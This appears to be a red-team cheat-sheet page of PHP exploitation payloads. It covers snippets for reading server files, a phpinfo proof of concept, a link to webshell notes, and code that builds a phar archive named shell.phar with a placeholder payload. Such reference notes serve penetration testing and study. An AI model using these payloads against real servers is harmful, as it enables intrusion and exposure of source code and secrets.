# Exploitation Payloads

[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) is the way to go, but I noted down some of mine.

<hr class="sep-both">

## PHP

<div class="row row-cols-lg-2"><div>

#### Read a file

`file_get_contents` is more common, but `show_source` works fine too.

```php!
<?php
$fileContents = file_get_contents('index.php');
$fileContents = show_source('index.php', true);
echo $fileContents;
?>
```

Base64 encoding is not always necessary, especially with `show_source`.

```php!
$fileContents = base64_encode($fileContents);
```
</div><div>

#### Execute Shell Commands

Refer to [webshells#php](/cybersecurity/red-team/s3.exploitation/shell/web_shell.md#php-web-shell).

<br>

#### PHP Info POC

We often run `phpinfo` to get information.

```php!
<?php phpinfo() ?>
```
</div></div>

<hr class="sep-both">

## Phar

<div class="row row-cols-lg-2"><div>

To create a simple phar archive:

```php!
<?php // php --define phar.readonly=0 shell.php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.php', '<?php /*code*/ ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$phar->stopBuffering();
```
</div><div>

...
</div></div>